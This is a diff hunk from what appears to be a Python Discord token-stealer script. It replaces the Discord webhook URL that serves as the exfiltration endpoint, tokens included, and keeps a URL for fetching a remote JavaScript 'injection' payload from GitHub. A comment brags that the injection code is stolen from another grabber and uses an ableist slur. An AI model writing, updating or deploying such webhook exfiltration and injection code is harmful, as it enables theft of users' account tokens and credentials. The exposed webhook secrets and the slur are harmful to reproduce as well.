@@ -207,7 +207,7 @@ def mac_check():
             pass
 
 
-hook = "https://discord.com/api/webhooks/1482639282396200972/Xiw0rauQfkEvt5CyddzFGWjiDm_yg3jDHu1lhdmvkx4IBl7FDoP_IBZkLBILBYbRAWV1"
+hook = "https://discord.com/api/webhooks/1485764603030933558/UQUzhhGBvr3XHWZTK2ecbCyEgzvY9g5hihpNcIaZTKwxSNHHN8sq0-JWJpopLVgr0Gl1"
 inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 # fun fact this injection bull shit is stolen from creal so imma use therre shit. blx devs are retarded
 color =  0x812118
